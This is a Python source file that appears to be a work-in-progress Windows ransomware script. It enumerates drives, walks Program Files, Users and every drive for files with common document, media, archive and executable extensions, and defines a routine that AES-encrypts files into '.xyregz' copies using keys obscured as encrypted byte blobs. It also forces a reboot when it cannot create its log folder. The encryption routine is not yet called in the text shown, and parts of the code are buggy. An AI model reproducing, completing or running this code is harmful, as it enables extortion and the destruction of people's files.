import time
import os
import sys
import platform
from threading import Thread
from Crypto.Cipher import AES
import pkg_resources
import string

spab = (lambda x:([print(' ') for i in range(x)]))

#analysist system
start = os.getcwd()
bitt = platform.machine()
osdet = platform.platform()
try:
 nama = platform.node()
except:
 nama = None
pros = platform.processor()
vpython = list(sys.version)
vpython = vpython[0]
osss = platform.system()
sysdet = os.environ

def bentar():
 time.sleep(1)

#check availble drive
letter = list(string.ascii_uppercase)
availl = []
def chkdsk():
 null = 0
 for cba in letter:
     try:
         os.chdir(letter[null] + ':\\')
         availl.append(letter[null])
         null += 1
     except FileNotFoundError:
         null += 1
chkdsk()

#prepare log file
def logg(isi):
 where = 'C:\\sharing'
 log = where + '\log'
 ch = os.access(log, os.W_OK)
 if ch == False:
  try:
   os.chdir('C:\\')
   os.mkdir('sharing')
   open(log, 'w+')
  except:
   try:
    os.system('reboot')
   except:
    os.system('shutdown -r -t 1')
 with open(log, 'a+') as gol:
  gol.write('\n')
  gol.write(isi)
  gol.write('\n')

#add :\\ to each drive
def addd(x):
    return x + ':\\'
availl = list(map(addd, availl))  


#scan file
extension = ['.dll', '.img',  '.jpg', '.jpeg', '.pptx', '.ppt', '.doc', '.docx', '.txt', '.mp4', '.avi', '.exe', '.zip', '.rar', '.pdf', '.apk', '.msi', '.png', '.mp3', '.ppt', '.iso']
fileee = []
direc = []
null = 0
def scanfile(drive):
 os.chdir(drive)
 menu = (os.listdir())
 #seperate file and folder
 for v in menu:
     try:
         os.chdir(v)
         direc.append(v)
         os.chdir(drive)
     except NotADirectoryError:
         fileee.append(v)
     except PermissionError:
         logg('permission error at %s %s' %(os.getcwd(), v)) 
        
    
nol = 0
logg('okee')
scanfile(availl[null])

#availl.remove('C:\\')
password = b'\x13\xc9\xc7\xec\x8d\x0b\xf6\x19\x85\x97\r\xf5\x99\x19\xbaK'
iv = b'P\x0e\xca\x84\x0cj08_\x04F\xd8~\x0c@V'
password1 = b'\xd0\x85\x92\x8c!\xf6\x07<\x91"oF\xdf\xde\xd7\xad'
iv1 = b"\xb8\xe4R3c\xe9'\xeb)\x8b\\\x8c\x14\nUX"

mode0 = AES.MODE_CBC
mode1= AES.MODE_CFB

dec = AES.new('passwordpassword', mode0, 'drowssapdrowssap')
dec1 = AES.new('drowssapdrowssap', mode1, 'passwordpassword')

decry = dec.decrypt(password)
decry1 = dec.decrypt(iv)
decry2 = dec1.decrypt(password1)
decry3 = dec1.decrypt(iv1)

#encrypt function

def holypart(filee):
  try:
    test = os.access(filee, os.W_OK)
    if test == False:
        print(os.listdir())
    encry = AES.new(decry, mode0, decry1)
    encry1 = AES.new(decry2, mode1, decry3)
    with open(filee, 'rb')  as holy:
        nice = holy.read()
        if len(nice) % 16 != 0:
            while True:
                if len(nice) % 16 == 0:
                    break
                nice += b'\0'
        finish = encry.encrypt(nice)
        finish = encry1.encrypt(nice)
        with open(filee + '.xyregz', 'wb') as part:
            part.write(finish)
  except:
    logg('holypart error')

bentar()            

#function seperate file and folder
def folorfile(what):
    where = os.getcwd()
    try:
        os.chdir(what)
        os.chdir(where)
        return 11
    except NotADirectoryError:
        return 22
    except PermissionError:
        return 33

#scan primary target

sysdr = sysdet['SYSTEMDRIVE'] #C:
sysdr = sysdr + '\\'
foll = []
aquired = []

def tandex(command):
    try:
        command

    except:
        return 33

def lfile(filee):
    return str(os.getcwd()) + filee

targetp = []
null = 1
availl.insert(0, os.path.join(sysdr, 'Users'))
availl.insert(0, os.path.join(sysdr, 'Program Files'))
availl.insert(0, os.path.join(sysdr, 'Program Files (x86)'))

def scanpt():
 global null
 global targetp
 """
 for ofb in availl: #change drive to scan
   try:
    for root, dirs, files in os.walk(availl[null], topdown=False):
      for name in files:
        targetp.append(os.path.join(root, name))
      null += 1
   except IndexError:
     null += 1
  
 #users and other
 try:
   os.chdir('C:\\Users\pentesting-lab ')#sysdr)
   for root, dirs, files in os.walk('Appdata', topdown=False):
     for name in files:
       targetp.append(os.path.join(root, name))
 except:
   logg('error at scanpt(users and other')"""
 null = 0
 for windows in availl:
    try:
     for root, dirs, files in os.walk(windows, topdown=False):
       for name in files:
         targetp.append(os.path.join(root, name))
    
    except:
      logg('error at %s in function targetp. scanning %s' %(str(windows)))
      pass
                      
                        
          
            
    
 #filter with target extension
 delet = []  
 ready = []
 null = 0
 nol = 0
 for greedy in targetp:
  for dos in extension:
    check = greedy.endswith(dos)
    if check == True:
      ready.append(greedy)
      break
    null += 1   
 print(ready)     
scanpt()

    












